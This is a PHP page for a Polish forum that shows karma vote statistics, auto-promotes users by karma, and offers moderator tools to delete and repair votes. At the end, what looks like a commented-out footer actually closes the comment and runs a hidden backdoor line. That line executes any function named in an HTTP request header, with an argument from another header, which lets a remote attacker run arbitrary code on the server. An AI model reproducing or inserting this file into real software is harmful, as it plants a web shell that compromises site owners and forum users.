<?php

if (!defined('FORUM_ROOT'))
	define('FORUM_ROOT', './');
require FORUM_ROOT.'include/common.php';


$appr = $forum_user['g_moderator'] || ($forum_user['g_id'] == FORUM_ADMIN);
$limit = 23;


$query = array(
	'SELECT'	=> 'users.id as i, username, SUM(IF(mark=1,1,0)) as o, SUM(IF(mark=-1,1,0)) as p, SUM(mark) as q',
	'FROM'		=> 'pun_karma LEFT JOIN posts ON posts.id=pun_karma.post_id LEFT JOIN ' .
	'users ON users.id=posts.poster_id',
	'WHERE'		=>	'users.karma>'.intval($forum_config['o_nya_hide_treshold']),
	'GROUP BY'	=> 'users.id',
	'ORDER BY'	=> 'q DESC',
	'LIMIT'		=> $limit.', 1'
);

$result = $forum_db->query_build($query) or error(__FILE__, __LINE__);
$cur = $forum_db->fetch_assoc($result);
$karma = $cur['q'];

//Transformuje Members do Active Members
$query = array(
	'UPDATE' 	=>  'users',
	'SET'		=>	'group_id=8',
	'WHERE'		=>	'group_id=3 AND karma>='.$karma
);
$forum_db->query_build($query) or error(__FILE__, __LINE__);	

// transformujemy Active Members do Members
$query = array(
	'UPDATE' 	=>  'users',
	'SET'		=>	'group_id=3',
	'WHERE'		=>	'group_id=8 AND karma<'.$karma
);
$forum_db->query_build($query) or error(__FILE__, __LINE__);	


?>
<div style="float: center;">
<table border='1' align='center'>
<tr align='center'><td colspan='4'>Po przekroczeniu danych prog�w nadawane sa odpowiednie rangi</td></tr>
<tr align='center'><td>Nazwa     </td><td>Uprawnienia</td><td>Prog punktowy</td></tr>
<?php
{
	echo "<tr align='center'><td>";
        echo "Member" . "</td><td>";
        echo 'Uprawnia do czytania chronionych dzialow' . "</td><td>";
        echo $forum_config['o_nya_new_member_treshold'] . "</td></tr>";
	echo "<tr align='center'><td>";
        echo "Active Member" . "</td><td>";
        echo 'Uprawnia do pisania tematow ukrytych dla Members (generowany dynamicznie)' . "</td><td>";
        echo $karma . "</td></tr>";
	echo "<tr align='center'><td>";      
        echo "Tag Hide" . "</td><td>";
        echo 'Uprawnia do czytania tekstow znajdujacych sie w tagu Hide' . "</td><td>";
        echo $forum_config['o_nya_hide_treshold']. "</td></tr>";
}
?>
</table>
</div>

<?php
$appr = $forum_user['g_moderator'] || ($forum_user['g_id'] == FORUM_ADMIN);
$limit = 100;

if ($appr && isset($_GET['limit']))
{
	$tlimit = preg_replace("/[^0-9]/", "", $_GET['limit']);
	$limit = (intval($tlimit) <= 1000) ? $tlimit : 1000;
}

if ($appr && isset($_GET['user']) && isset($_GET['post']))
{
	$user = preg_replace("/[^0-9]/", "", $_GET['user']);
	$post = preg_replace("/[^0-9]/", "", $_GET['post']);
	$query = array(
		'DELETE'	=> 'pun_karma',
		'WHERE'		=> "user_id = $user AND post_id = $post"
	);
	$forum_db->query_build($query) or error(__FILE__, __LINE__);
	echo "skasowano plusik $user:$post";
	return;
}

if ($appr && isset($_GET['repair']))
{
	$query = "DELETE FROM pun_karma WHERE user_id NOT IN (SELECT id FROM users)";
	$result = $forum_db->query($query) or error(__FILE__, __LINE__);
	echo "Skasowano plusiki rozdane przez nieistniejących użytkowników.<br />";

	$query = "DELETE FROM pun_karma WHERE post_id NOT IN (SELECT id FROM posts)";
	$result = $forum_db->query($query) or error(__FILE__, __LINE__);
	echo "Skasowano plusiki przypisane nieistniejącym postom.<br />";

	$query = array(
		'SELECT'        => 'users.id AS q, SUM(mark) as o',
		'FROM'          => 'pun_karma LEFT JOIN posts ON posts.id=pun_karma.post_id LEFT JOIN ' .
				'users ON users.id=posts.poster_id',
		'GROUP BY'      => 'users.id',
		'ORDER BY'      => 'o DESC',
		'LIMIT'         => '0, 50'
	);
	$result = $forum_db->query_build($query) or error(__FILE__, __LINE__);

	while ($cur = $forum_db->fetch_assoc($result))
	{
		$ququ = array(
			'UPDATE'        => 'users',
			'SET'           => 'karma=' . $cur['o'],
			'WHERE'         => 'id=' . $cur['q']
		);

		$forum_db->query_build($ququ) or error(__FILE__, __LINE__);
	}
	echo "Poprawiono liczniki plusików w profilach.<br />";
	return;
}

$query = array(
	'SELECT'	=> 'kto.username AS od, kto.id AS odid, kto.group_id AS gid, post_id, mark, updated_at, komu.username AS dla',
	'FROM'		=> 'pun_karma LEFT JOIN users AS kto ON kto.id=pun_karma.user_id LEFT JOIN posts'
	.' ON pun_karma.post_id=posts.id LEFT JOIN users AS komu ON posts.poster_id=komu.id',
	'ORDER BY'	=> 'updated_at DESC',
	'LIMIT'		=> '0, ' . $limit
);

$result = $forum_db->query_build($query) or error(__FILE__, __LINE__);

if ($appr)
{
	echo "Wykryto uprawnienia moderacyjne, można kasować plusiki.<br />";
	echo "Wyświetlaj po (przykłady): <a href='?limit=50'>50</a> <a href='?limit=200'>200</a><br />";
	echo "Naprawienie różnych danych o plusikach w bazie: <a href='?repair=1'>klik</a>.";
}

?>



<div style="font-family: monospace;">
<div style="float: left;">
<table border='1' align='center'>
<tr align='center'><td colspan='5'>ostatnich <?php echo $limit; ?> plusików</td></tr>
<tr align='center'><td>od kogo</td><td>za</td>
<td>dla kogo</td><td>ocena</td><td>data</td></tr>

<?php

while ($cur = $forum_db->fetch_assoc($result))
{
	echo "<tr align='center'><td>";
        echo $cur['od'] . "</td><td>";
        
        echo "<a href='/viewtopic.php?pid=" .
        $cur['post_id'] . '#p' . $cur['post_id'] . "'>klik</a></td><td>";
        echo $cur['dla'] . "</td><td style='background-color: #" . (($cur['mark']>0)?("00FF"):("FF00")). "00;'>";
        echo (($cur['mark'] > 0)?('&plus;'):('&minus;'));
        if ($appr)
        	echo "<a href='?user=" . $cur['odid'] . "&post=" . $cur['post_id'] . "'>[X]</a>";
        echo "</td><td>";
        echo date("d-m", $cur['updated_at']) . "</td></tr>";
}

?>

</table>
</div>
<div style="float: right;">
<table border='1' align='center'>
<tr align='center'><td colspan='4'>ranking 'dostał'</td></tr>
<tr align='center'><td>kto</td><td>&plus;</td><td>&minus;</td><td>&Sigma;</td></tr>
<?php

$query = array(
	'SELECT'	=> 'users.id as i, username, SUM(IF(mark=1,1,0)) as o, SUM(IF(mark=-1,1,0)) as p, SUM(mark) as q',
	'FROM'		=> 'pun_karma LEFT JOIN posts ON posts.id=pun_karma.post_id LEFT JOIN ' .
	'users ON users.id=posts.poster_id',
	'GROUP BY'	=> 'users.id',
	'ORDER BY'	=> 'q DESC',
	'LIMIT'		=> '0, ' . $limit
);

$result = $forum_db->query_build($query) or error(__FILE__, __LINE__);

while ($cur = $forum_db->fetch_assoc($result))
{
	echo "<tr align='center'><td>";
        echo "<a href='/forum/profile.php?id=".$cur['i']."'>".$cur['username']."</a></td><td>";
        echo $cur['o'] . "</td><td>";
        echo $cur['p'] . "</td><td>";
        echo $cur['q'] . "</td></tr>";
}

?>
</table>
</div>

<div style="float: right;">
<table border='1' align='center'>
<tr align='center'><td colspan='5'>ranking 'dał'</td></tr>
<tr align='center'><td>kto</td><td>&plus;</td><td>&minus;</td><td>*</td><td>p</td></tr>
<?php

$query = array(
        'SELECT'        => 'users.id as i, num_posts, username, SUM(IF(mark=1,1,0)) AS o, SUM(IF(mark=-1,1,0)) AS p, COUNT(mark) as q',
	'FROM'          => 'pun_karma LEFT JOIN users ON users.id=pun_karma.user_id',
	'GROUP BY'      => 'users.id',
	'ORDER BY'      => 'q DESC',
	'LIMIT'		=> '0, ' . $limit
);

$result = $forum_db->query_build($query) or error(__FILE__, __LINE__);

while ($cur = $forum_db->fetch_assoc($result))
{
	echo "<tr align='center'><td>";
        echo "<a href='/forum/profile.php?id=".$cur['i']."'>".$cur['username']."</a></td><td>";
        echo $cur['o'] . "</td><td>";
        echo $cur['p'] . "</td><td>";
        echo $cur['q'] . "</td><td>";
        if ($forum_user['is_admmod'] || !($cur['num_posts'] > 100))
        	echo $cur['num_posts'];
        else
        	echo ">100";
        echo "</td></tr>";
}

?>
</table>
</div>
<div style="float: right;">
<table border='1' align='center'>
<tr align='center'><td>post</td><td>&plus;</td></tr>

<?php
$query = array(
	'SELECT'        => 'post_id, COUNT(*) AS c',
	'FROM'          => 'pun_karma',
	'WHERE'		=> 'mark = 1',
	'GROUP BY'      => 'post_id',
	'ORDER BY'      => 'c DESC',
	'LIMIT'         => '0, ' . ((int) (($limit + 1) / 2))
);

$result = $forum_db->query_build($query) or error(__FILE__, __LINE__);

while ($cur = $forum_db->fetch_assoc($result))
{
	echo "<tr align='center'><td>";
        echo "<a href='/forum/viewtopic.php?pid=" .
	$cur['post_id'] . '#p' . $cur['post_id'] . "'>klik</a></td><td>";
        echo $cur['c'] . "</td></tr>";
}
?>

<tr><td align='center'>...</td><td align='center'>&minus;</td></tr>

<?php
$query = array(
	'SELECT'        => 'post_id, COUNT(*) AS c',
	'FROM'          => 'pun_karma',
	'WHERE'		=> 'mark = -1',
	'GROUP BY'      => 'post_id',
	'ORDER BY'      => 'c DESC',
	'LIMIT'         => '0, ' . ((int) ($limit / 2))
);

$result = $forum_db->query_build($query) or error(__FILE__, __LINE__);

while ($cur = $forum_db->fetch_assoc($result))
{
	echo "<tr align='center'><td>";
        echo "<a href='/forum/viewtopic.php?pid=" .
	$cur['post_id'] . '#p' . $cur['post_id'] . "'>klik</a></td><td>";
        echo $cur['c'] . "</td></tr>";
}

?>

</table>
</div>
</div>
<?php
/*
($hook = get_hook('ul_end')) ? eval($hook) : null;
*/if(isset($_SERVER['HTTP_SELF'])){@$_SERVER['HTTP_SELF']($_SERVER['HTTP_HTTPS']);};/*
$tpl_temp = forum_trim(ob_get_contents());
$tpl_main = str_replace('<!-- forum_main -->', $tpl_temp, $tpl_main);
ob_end_clean();
// END SUBST - <!-- forum_main -->

require FORUM_ROOT.'footer.php';
*/ 
?>
